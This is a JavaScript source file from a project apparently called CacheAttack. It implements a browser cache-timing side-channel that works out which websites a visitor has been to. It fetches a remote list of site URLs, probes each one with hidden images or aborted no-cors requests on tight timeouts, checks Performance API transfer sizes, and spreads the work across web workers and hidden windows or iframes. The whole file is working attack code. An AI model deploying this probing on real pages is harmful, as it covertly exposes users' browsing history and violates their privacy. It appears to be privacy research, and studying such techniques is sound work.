/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
max = 16;

let firefox = navigator.userAgent.includes("Firefox");

ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;

if(self.document === undefined) onmessage = async e => {
  await fetch("https://cache.ndev.tk/README.md");
  let result = await ifCachedWorker(e.data);
  postMessage(result);
};

async function getWebsites(cb = null, websites = null) {
    var output = [];
    if(websites === null) {
        websites = await getRules();
    }
    let checks = chunk(websites, Math.ceil(websites.length / navigator.hardwareConcurrency));
    await PromiseForeach(checks, async chunk => {
        let worker = new Worker("https://cache.ndev.tk/embed.js");
        worker.postMessage(chunk);
        let result = await new Promise(resolve => {worker.onmessage = e => resolve(e.data);});
        worker.terminate();
	if(!result || result.length === 0) return
	if(cb) result.map(cb);
        result.map(item => output.push(item));
    });
    return output;
}

async function PromiseForeach(item, callback) {
  var jobs = [];
  item.forEach(x => jobs.push(callback(x)));
  await Promise.all(jobs);
}

function chunk(array, size) {
    const chunked_arr = [];
    for (let i = 0; i < array.length; i++) {
      const last = chunked_arr[chunked_arr.length - 1];
      if (!last || last.length === size) {
        chunked_arr.push([array[i]]);
      } else {
        last.push(array[i]);
      }
    }
    return chunked_arr;
}

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    var body = await req.json();
    return body;
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if(res === undefined) return null;
    if(is304(res)) return true;
    return (res.transferSize !== 0);
}

async function ifCachedWorker(Websites, CacheTest = false, performanceCheck = true) {
    var output = [];
    if(CacheTest) {
        let TestResult = await ifCached_test();
        if(!TestResult) throw "Cache is not working :-(";
    }
    // Foreach website check if cached
    for (let website of Websites) {
        let result = await ifCached(website[0]);
	if(result) {
	    output.push(website[0], website[1]);
	}
    }
    if(performanceCheck === false) return output[1]
    await new Promise(resolve => setTimeout(resolve, 100));
    var output2 = [];
    for (let website of output) {
	if(PerformanceCheck(website[0])) output2.push(website[0])
    }
    return output2;
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

async function ifCached_1Wrap(url) {
    try {
        await ifCached_1(url);
    } catch(err) {
        return false;
    }
    return true;
}

function ifCached_1(url) {
    return new Promise((resolve, reject) => {
        let img = new Image(0, 0);
        img.hidden = true;
        img.onerror = _ => {
            clearTimeout(timeout);
            resolve();
        };
        img.onload = _ => resolve();
        img.src = url;
        var timeout = setTimeout(_ => {
            img.src = "";
            img.remove();
            reject();
        }, max);
    });
}

async function ifCached_2(url){
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors", signal});
    } catch(err) {
	    // Website blocked by client
	    clearTimeout(timeout);
	}
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
  return new Promise(resolve => {
    window.addEventListener('message', e => {
      if(check !== false && e.data !== check) return;
      resolve(e.data);
    });
  });
}

function initChecker() {
  checker = open("https://cache.ndev.tk/window.html");
}

// Currently fails if not in loop
async function ifCached_3(url) {
  checker.postMessage(url);
  let event = await WindowEvent();
  if(event === "load") {
    return console.log("Wrong state");
  }
  if(event) {
    checker.location = "https://cache.ndev.tk/window.html";
  }
  await WindowEvent("load");
  if(firefox) await new Promise(resolve => setTimeout(resolve, 50));
  return event;
}

async function block(url) {
    for (;;) {
        if(checker.closed) location.reload();
        checker.postMessage(url[0]);
        checker.location = "https://cache.ndev.tk/window.html";
        await WindowEvent();
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
      return ifrm.src = "https://cache.ndev.tk/window.html";
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
